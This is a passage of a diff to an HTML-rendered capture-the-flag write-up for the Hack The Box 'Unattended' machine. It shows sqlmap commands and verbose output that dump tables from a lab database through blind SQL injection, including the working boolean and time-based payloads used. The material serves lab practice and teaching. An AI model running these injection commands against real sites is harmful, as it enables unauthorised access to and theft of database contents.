+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">11</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">creditLimit</span>
 </code></pre></div></div>
 <p><br> I only dumped <code class="highlighter-rouge">filepath</code> and <code class="highlighter-rouge">idname</code> because these are the ones I saw in the source of <code class="highlighter-rouge">index.php</code>.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T filepath --dump --threads 10                  
-       __H__
- ___ ___[']_____ ___ ___  {1.3.4#stable} 
-|_ -| . [)]     | .'| . | 
-|___|_  ["]_|_|_|__,|  _| 
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">unattended</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">nestedflanders</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">465</span> <span class="o">-</span><span class="n">D</span> <span class="n">neddy</span> <span class="o">-</span><span class="n">T</span> <span class="n">filepath</span> <span class="c1">--dump --threads 10                  </span>
+       <span class="n">__H__</span>
+ <span class="n">___</span> <span class="n">___</span><span class="p">[</span><span class="s1">']_____ ___ ___  {1.3.4#stable} 
+|_ -| . [)]     | .'</span><span class="o">|</span> <span class="p">.</span> <span class="o">|</span> 
+<span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="n">_</span>  <span class="p">[</span><span class="nv">"]_|_|_|__,|  _| 
       |_|V...       |_|   http://sqlmap.org                                                                            
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><span class="err">\</span><span class="nv">
 
 [*] starting @ 17:55:21 /2019-08-23/
 [17:55:21] [INFO] resuming back-end DBMS 'mysql'
@@ -598,344 +592,344 @@ Table: filepath
 [17:58:05] [INFO] table 'neddy.filepath' dumped to CSV file '/root/.sqlmap/output/www.nestedflanders.htb/dump/neddy/filepath.csv'             
 [17:58:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.nestedflanders.htb'
 [*] ending @ 17:58:05 /2019-08-23/
-</code></pre></div></div>
+</span></code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T idname --dump --threads 10
-        ___               
-       __H__
- ___ ___[)]_____ ___ ___  {1.3.4#stable} 
-|_ -| . [)]     | .'| . |  
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">unattended</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">nestedflanders</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">465</span> <span class="o">-</span><span class="n">D</span> <span class="n">neddy</span> <span class="o">-</span><span class="n">T</span> <span class="n">idname</span> <span class="c1">--dump --threads 10</span>
+        <span class="n">___</span>               
+       <span class="n">__H__</span>
+ <span class="n">___</span> <span class="n">___</span><span class="p">[)]</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="err">{</span><span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span><span class="o">#</span><span class="k">stable</span><span class="err">}</span> 
+<span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[)]</span>     <span class="o">|</span> <span class="p">.</span><span class="s1">'| . |  
 |___|_  ["]_|_|_|__,|  _|
       |_|V...       |_|   http://sqlmap.org                                                                            
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program           
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span><span class="n">s</span> <span class="n">responsibility</span> <span class="k">to</span> <span class="n">obey</span> <span class="k">all</span> <span class="n">applicable</span> <span class="k">local</span><span class="p">,</span> <span class="k">state</span> <span class="k">and</span> <span class="n">federal</span> <span class="n">laws</span><span class="p">.</span> <span class="n">Developers</span> <span class="n">assume</span> <span class="k">no</span> <span class="n">liability</span> <span class="k">and</span> <span class="k">are</span> <span class="k">not</span> <span class="n">responsible</span> <span class="k">for</span> <span class="k">any</span> <span class="n">misuse</span> <span class="k">or</span> <span class="n">damage</span> <span class="n">caused</span> <span class="k">by</span> <span class="n">this</span> <span class="n">program</span>           
 
-[*] starting @ 18:03:42 /2019-08-23/
-[18:03:42] [INFO] resuming back-end DBMS 'mysql'
-[18:03:42] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:                       
----        
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=465' AND 6602=6602 AND 'YxJr'='YxJr
-    Type: time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind
-    Payload: id=465' AND SLEEP(5) AND 'APKt'='APKt                       
----
-[18:03:43] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.10.3
-back-end DBMS: MySQL &gt;= 5.0.12
-[18:03:43] [INFO] fetching columns for table 'idname' in database 'neddy'
-[18:03:43] [INFO] resumed: 3
-[18:03:43] [INFO] retrieving the length of query output
-[18:03:43] [INFO] retrieved: 2
-[18:03:52] [INFO] retrieved: id
-[18:03:52] [INFO] retrieving the length of query output
-[18:03:52] [INFO] retrieved: 4
-[18:04:02] [INFO] retrieved: name
-[18:04:02] [INFO] retrieving the length of query output
-[18:04:02] [INFO] retrieved: 8
-[18:04:12] [INFO] retrieved: disabled
-[18:04:12] [INFO] fetching entries for table 'idname' in database 'neddy'
-[18:04:12] [INFO] fetching number of entries for table 'idname' in database 'neddy'
-[18:04:12] [INFO] retrieved: 6
-[18:04:17] [INFO] retrieving the length of query output
-[18:04:17] [INFO] retrieved: 1
-[18:04:21] [INFO] retrieved: 1
-[18:04:27] [INFO] retrieving the length of query output
-[18:04:27] [INFO] retrieved: 1
-[18:04:33] [INFO] retrieved: 1
-[18:04:39] [INFO] retrieving the length of query output
-[18:04:39] [INFO] retrieved: 8
-[18:04:51] [INFO] retrieved: main.php
-[18:04:51] [INFO] retrieving the length of query output
-[18:04:51] [INFO] retrieved: 1
-[18:04:55] [INFO] retrieved: 1
-[18:05:01] [INFO] retrieving the length of query output
-[18:05:01] [INFO] retrieved: 1
-[18:05:05] [INFO] retrieved: 2
-[18:05:12] [INFO] retrieving the length of query output
-[18:05:12] [INFO] retrieved: 9
-[18:05:24] [INFO] retrieved: about.php
-[18:05:24] [INFO] retrieving the length of query output
-[18:05:24] [INFO] retrieved: 1
-[18:05:28] [INFO] retrieved: 1
-[18:05:34] [INFO] retrieving the length of query output
-[18:05:34] [INFO] retrieved: 1
-[18:05:38] [INFO] retrieved: 3
-[18:05:44] [INFO] retrieving the length of query output
-[18:05:44] [INFO] retrieved: 11
-[18:06:01] [INFO] retrieved: contact.php
-[18:06:01] [INFO] retrieving the length of query output
-[18:06:01] [INFO] retrieved: 1
-[18:06:05] [INFO] retrieved: 0
-[18:06:11] [INFO] retrieving the length of query output
-[18:06:11] [INFO] retrieved: 2
-[18:06:21] [INFO] retrieved: 25
-[18:06:21] [INFO] retrieving the length of query output
-[18:06:21] [INFO] retrieved: 4
-[18:06:31] [INFO] retrieved: main
-[18:06:31] [INFO] retrieving the length of query output
-[18:06:31] [INFO] retrieved: 1
-[18:06:35] [INFO] retrieved: 0
-[18:06:41] [INFO] retrieving the length of query output
-[18:06:41] [INFO] retrieved: 3
-[18:06:51] [INFO] retrieved: 465
-[18:06:51] [INFO] retrieving the length of query output
-[18:06:51] [INFO] retrieved: 5
-[18:07:01] [INFO] retrieved: about
-[18:07:01] [INFO] retrieving the length of query output
-[18:07:01] [INFO] retrieved: 1
-[18:07:05] [INFO] retrieved: 0
-[18:07:12] [INFO] retrieving the length of query output
-[18:07:12] [INFO] retrieved: 3
-[18:07:22] [INFO] retrieved: 587
-[18:07:22] [INFO] retrieving the length of query output
-[18:07:22] [INFO] retrieved: 7
-[18:07:32] [INFO] retrieved: contact
-Database: neddy
-Table: idname
-[6 entries]
-+-----+-------------+----------+
-| id  | name        | disabled |
-+-----+-------------+----------+
-| 1   | main.php    | 1        |
-| 2   | about.php   | 1        |
-| 3   | contact.php | 1        |
-| 25  | main        | 0        |
-| 465 | about       | 0        |
-| 587 | contact     | 0        |
-+-----+-------------+----------+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">starting</span> <span class="o">@</span> <span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span> <span class="o">/</span><span class="mi">2019</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">23</span><span class="o">/</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resuming</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="s1">'mysql'</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="k">connection</span> <span class="k">to</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span>
+<span class="n">sqlmap</span> <span class="n">resumed</span> <span class="n">the</span> <span class="n">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">from</span> <span class="n">stored</span> <span class="k">session</span><span class="p">:</span>                       
+<span class="c1">---        </span>
+<span class="k">Parameter</span><span class="p">:</span> <span class="n">id</span> <span class="p">(</span><span class="k">GET</span><span class="p">)</span>
+    <span class="k">Type</span><span class="p">:</span> <span class="n">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="k">AND</span> <span class="n">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="o">-</span> <span class="k">WHERE</span> <span class="k">or</span> <span class="k">HAVING</span> <span class="n">clause</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">id</span><span class="o">=</span><span class="mi">465</span><span class="s1">' AND 6602=6602 AND '</span><span class="n">YxJr</span><span class="s1">'='</span><span class="n">YxJr</span>
+    <span class="k">Type</span><span class="p">:</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span> <span class="k">AND</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">id</span><span class="o">=</span><span class="mi">465</span><span class="s1">' AND SLEEP(5) AND '</span><span class="n">APKt</span><span class="s1">'='</span><span class="n">APKt</span>                       
+<span class="c1">---</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="k">is</span> <span class="n">MySQL</span>
+<span class="n">web</span> <span class="n">application</span> <span class="n">technology</span><span class="p">:</span> <span class="n">Nginx</span> <span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">3</span>
+<span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">columns</span> <span class="k">for</span> <span class="k">table</span> <span class="s1">'idname'</span> <span class="k">in</span> <span class="k">database</span> <span class="s1">'neddy'</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">3</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">2</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">52</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">id</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">52</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">52</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">4</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">name</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">8</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">disabled</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">entries</span> <span class="k">for</span> <span class="k">table</span> <span class="s1">'idname'</span> <span class="k">in</span> <span class="k">database</span> <span class="s1">'neddy'</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="k">of</span> <span class="n">entries</span> <span class="k">for</span> <span class="k">table</span> <span class="s1">'idname'</span> <span class="k">in</span> <span class="k">database</span> <span class="s1">'neddy'</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">6</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">27</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">27</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">8</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">main</span><span class="p">.</span><span class="n">php</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">2</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">9</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">about</span><span class="p">.</span><span class="n">php</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">28</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">38</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">3</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">11</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">contact</span><span class="p">.</span><span class="n">php</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">0</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">11</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">11</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">2</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">25</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">4</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">main</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">35</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">0</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">41</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">41</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">3</span>
